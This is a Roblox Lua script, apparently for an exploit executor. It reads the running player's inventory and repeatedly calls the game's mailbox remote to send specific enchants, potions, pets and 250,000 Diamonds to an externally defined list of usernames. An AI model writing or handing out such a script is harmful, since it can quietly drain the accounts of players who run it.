

local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
local result = saveModule.Get()


item = "Super Lightning"

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == item then
	for j, username in ipairs(names)do
        	local args = {
            	username,
            	item,
            	"Enchant",
            	i,
            	1
        	}
        	game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
		task.wait(2)
	end
    end
end

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Coins" then
        if v.tn == 7 then
	for j, username in ipairs(names)do
            local args = {
                username,
                "Coins Enchant",
                "Enchant",
                i,
                1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
	task.wait(2)
	end
        end
    end
end

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Tap Powers" then
        if v.tn == 5 then
	for j, username in ipairs(names)do
            local args = {
                username,
                "Tap Power Enchant",
                "Enchant",
                i,
                2
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
	task.wait(2)
	end
        end
    end
end

task.wait(2)



local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Coins" then
        if v.tn == 5 then
	for j, username in ipairs(names)do
            local args = {
                username,
                "Coins Potion",
                "Potion",
                i,
                10
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
	task.wait(2)
	end
        end
    end
end

task.wait(2)



local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Damage" then
        if v.tn == 5 then
	for j, username in ipairs(names)do
            local args = {
                username,
                "Damage Potion",
                "Potion",
                i,
                10
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
	task.wait(2)
	end
        end
    end
end

task.wait(2)

local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
local result = saveModule.Get()


item = "Frostbyte Bear"

local pet = result.Inventory.Pet
for i, v in pairs(pet) do
    if v.id == item then
	for j, username in ipairs(names)do
        	local args = {
            	username,
            	item,
            	"Pet",
            	i,
            	25
        	}
        	game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
		task.wait(2)
	end
    end
end

local  diamond = 250000
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end
local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
local result = saveModule.Get()
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == 'Diamonds' then
        for j, username in ipairs(names) do
            local args = {
                [1] = username,
                [2] = v.id,
                [3] = 'Currency',
                [4] = i,
                [5] = diamond
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                unpack(args)
            )
            task.wait(2)
        end
    end
end
